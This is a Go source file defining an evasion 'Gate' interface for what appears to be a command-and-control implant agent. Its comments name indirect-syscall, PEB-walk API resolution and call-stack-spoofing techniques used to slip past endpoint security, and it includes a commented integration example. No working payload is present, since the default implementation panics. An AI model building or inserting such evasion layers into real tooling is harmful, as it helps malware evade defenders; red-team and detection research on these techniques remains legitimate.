// Package evasion defines the Gate abstraction for pluggable syscall
// dispatch, API resolution, and call-stack spoofing.
//
// The generated default panics on every call — replace it with your
// own implementation or wire in an existing framework (e.g. the
// "evasion" Go module) before the agent performs any OS interaction.
//
// Integration example (evasion module):
//
//	import "evasion"
//
//	type EvasionGate struct{ ev *evasion.Evasion }
//
//	func NewEvasionGate() *EvasionGate {
//	    return &EvasionGate{ev: evasion.New()}
//	}
//
//	func (g *EvasionGate) Init() error { return nil } // evasion.New() already initialises
//	func (g *EvasionGate) Syscall(num uint16, args ...uintptr) (uint32, error) {
//	    return g.ev.Syscall.S1(fmt.Sprintf("%d", num), false, args...)
//	}
//	func (g *EvasionGate) ResolveFn(module, function string) (uintptr, error) {
//	    h := g.ev.LoadLibrary(module)
//	    if h == 0 { return 0, fmt.Errorf("module %s not found", module) }
//	    p := g.ev.GetProcAddress(h, function)
//	    if p == 0 { return 0, fmt.Errorf("function %s not found", function) }
//	    return p, nil
//	}
//	func (g *EvasionGate) Call(fn uintptr, args ...uintptr) (uintptr, error) {
//	    r, _ := g.ev.CallWindowsAPIEx(fn, args...)
//	    return r, nil
//	}
//	func (g *EvasionGate) Close() {}
package evasion

// Gate is the single entry point for all OS-level evasion primitives.
//
// Implement this interface to provide:
//   - Indirect syscall dispatch (e.g. RecycleGate, HellsGate, SysWhispers)
//   - Manual API resolution without LoadLibrary/GetProcAddress (PEB walk)
//   - Optionally spoofed call stacks (e.g. Draugr)
//   - Direct function-pointer invocation through a clean trampoline
//
// All methods are called from the main agent goroutine; implementations
// do not need to be goroutine-safe unless the agent spawns extra workers.
type Gate interface {
	// Init performs one-time setup: SSN enumeration, gadget discovery,
	// spoof-context resolution, etc.  Called once at agent startup.
	Init() error

	// Syscall dispatches a raw syscall by number (SSN on Windows,
	// syscall number on Linux/Darwin).  Returns the kernel status code.
	Syscall(num uint16, args ...uintptr) (uint32, error)

	// ResolveFn manually resolves a function address from a module name
	// and export name (e.g. "ntdll.dll", "NtAllocateVirtualMemory").
	// Must not use LoadLibrary / GetProcAddress.
	ResolveFn(module, function string) (uintptr, error)

	// Call invokes an arbitrary function pointer with the given arguments.
	// Implementations may route through a spoofed call-stack trampoline.
	Call(fn uintptr, args ...uintptr) (uintptr, error)

	// Close releases any resources acquired during Init.
	Close()
}

// Default returns the panicking placeholder gate.
// Replace this at agent creation time with your real implementation.
func Default() Gate {
	return &defaultGate{}
}
